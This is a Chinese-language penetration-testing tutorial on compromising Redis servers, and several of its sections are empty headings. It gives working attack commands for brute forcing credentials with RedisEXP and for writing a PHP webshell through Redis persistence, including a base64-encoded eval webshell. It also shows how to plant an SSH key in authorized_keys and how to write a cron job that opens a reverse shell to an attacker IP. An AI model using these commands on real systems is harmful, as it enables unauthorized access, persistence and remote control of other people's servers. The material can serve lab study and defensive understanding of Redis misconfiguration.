## redis简介

* Redis的数据存储在内存中，读写速度极快，常用作缓存服务
* Redis支持多种数据类型，包括：
  - 字符串（String）
  - 列表（List）
  - 集合（Set）
  - 有序集合（Sorted Set）
  - 哈希（Hash）
  - 位图（Bitmap）
  - HyperLogLog
  - Streams
* Redis也支持数据持久化，可以将内存中的数据定期快照（RDB）或以追加方式记录（AOF），确保数据在系统崩溃后能够恢复
* 通过主从复制（Master-Slave Replication）和哨兵（Sentinel）模式，Redis可以实现高可用性，自动故障转移。主从复制也可被攻击者用于提权。
* Redis支持简单的事务机制，可以通过`MULTI`、`EXEC`和`DISCARD`命令实现多个操作的原子性
* Redis支持在服务器端执行Lua脚本，能够批量执行多个命令，提高效率

## 如何打入redis

### redis未授权访问

* Redis2.x和3.x版本在**默认情况下没有启用访问控制**，这意味着如果Redis实例没有经过适当配置，任何人都可以通过网络连接访问Redis，并执行redis的命令
* 在高版本下，redis**默认情况下没有启用访问控制**，但是默认开启protected-mode：
  * 默认只能本地访问
  * 如果开启远程访问，必须设置密码


在实战过程中很容易判断redis是否启用访问控制，所以这里不再复现

### redis爆破

如果redis开启了访问控制，最直接获取其权限的方式就是爆破，这里推荐使用工具[yuyan-sec/RedisEXP: Redis 漏洞利用工具 (github.com)](https://github.com/yuyan-sec/RedisEXP)，这是一个redis的综合利用工具，除了这里的爆破，后面还会用到它

```shell
# 爆破redis
RedisEXP_windows_amd64.exe -m brute -r 192.168.110.179 -p 6379 -f pass.txt
```

* redis原生是没有用户名 - 密码认证模式的，默认情况下只有密码没有用户名

### ssrf打redis

### redis注入命令

## 拿到redis权限后如何进一步提权

基本上分为三类：

* 利用redis写数据备份文件实现任意文件写，除了下面三个例子外，还可以写/etc/passwd等（写入时的乱码对我们可能有一些限制）
* 主从复制
* cve lua脚本的沙箱逃逸

### 写webshell

* 条件：
  * 知道网站绝对路径
  * 可以任意写文件
    * 需要该目录下的增删改查权限（这个一般需要redis以root权限运行或者于web服务器以相同的用户权限运行，还要防止selinux等一些权限控制系统，我在实验时通过apt包管理安装的redis默认运行在自动创建的用户redis下）
    * 在6.x版本及以后，需将配置文件中的enable-protected-configs设置为yes，这个配置默认为no限制了我们使用config set dir

这里搭建了一个简单的php站点，路径在`/www/wwwroot/192.168.110.177`下

```shell
# 设置要写入shell的路径
config set dir /www/wwwroot/192.168.110.177
# 对一个key写入webshell
set webshell "\n\n\n<?php phpinfo() ;?>\n\n\n"
# 持久化文件的文件名
config set dbfilename phpinfo.php
# 保存key
save
```

这里一般写入长度较短的小马没啥问题，要是写入的webshell长度过长，可能会遇到一些问题：

[原创 Paper | Windows 与 Java 环境下的 Redis 利用分析 (qq.com)](https://mp.weixin.qq.com/s/f7hPOoSSiRJpyMK51_Vxrw)

* 工具

```shell
# -s后是写入的内容的base64，-b是解码选项
# 这个命令应该是比较通用的，写任意文件，不止写webshell
RedisEXP_windows_amd64.exe -m shell -r ip -p port -w password -rp /website/path -rf webshellfilename -s XG5cblxuPD9waHAgZWNobyBldmFsKCRfR0VUWydzaGVsbCddKTs/PlxuXG5cbg== -b
```

### 写ssh-keygen公钥

* 和写webshell一样指定目录写文件的权限
* 目标开放ssh服务，而且允许使用秘钥登录

我们在攻击机上通过ssh-keygen -t rsa生成我们的证书，下图的id_rsa.pub就是公钥

![image-20241014165628535](./images/image-20241014165628535.png)

.ssh一般在~/.ssh，每个用户都有自己的专属目录，这里我们简单介绍一下.ssh目录下的文件：

* id_rsa，私钥文件，ssh服务端用它相对应的公钥来验证用户是否合法
* id_rsa，公钥文件
* known_hosts，存储客户端曾经连接过的ssh服务器主机信息
* authorized_keys，存放允许连接到服务器的客户端公钥，可以存放多个公钥
* config，自定义ssh客户端配置

```shell
# 这一步有时候有权限也不成功，可能是由于该目录不存在
config set dir /root/.ssh
config set dbfilename authorized_keys
# .....替换为ssh证书的公钥
# 这里有一个坑点，我们需要\n防止乱码的影响，但在redis-cli的交互模式下，\n不会被解析为换行，我们可以通过脚本或者echo "\n"|redis-cli set xxx来实现
set xxx "\n......\n"
save
```

* 工具

```shell
# 公钥两边的引号不要省略
RedisEXP_windows_amd64.exe -m ssh -r ip -p port -w password -u user -s "自己的公钥"
```

### 写计划任务

* 指定目录写文件的权限

* 系统限制

  * 这里在网上看到一些文章说ubuntu不适用而centos适用，因为
    * ubuntu的计划任务在/var/spool/cron/crontabs/下，要求权限为600才能正确被执行，而redis写入文件默认为644，centos则没有这个要求
    * centos的计划任务中可以有乱码，而ubuntu不行
  * 对于权限问题，ubuntu在/etc/cron.d目录下也可以写，而且没有权限限制
  * 但是对于乱码问题，Ubuntu对于定时计划有严格的格式要求，这里无法解决。

  ![image-20241014200637081](./images/image-20241014200637081-1728907602573-1.png)

```shell
#设置保存路径，centos的计划任务路径
config set dir /var/spool/cron/crontabs/ 
config set dbfilename shell 
#反弹shell
set xz "\n * bash -i >& /dev/tcp/192.168.33.131/8888 0>&1\n" 
```

* 工具

```shell
RedisEXP_windows_amd64.exe -m cron -r 目标ip -p 目标端口 -w password -L 反连ip -P 反连端口
```

### redis主从复制getshell

#### 远程主从

#### 本地主从

### CVE-2022-0543

## 其他用法

* 探测目录
  * 利用config set dir，前提是有权限，若目录不存在会返回`(error) ERR Changing directory: No such file or directory`

## 工具分析



## 实战案例

### redis到shiro反序列化

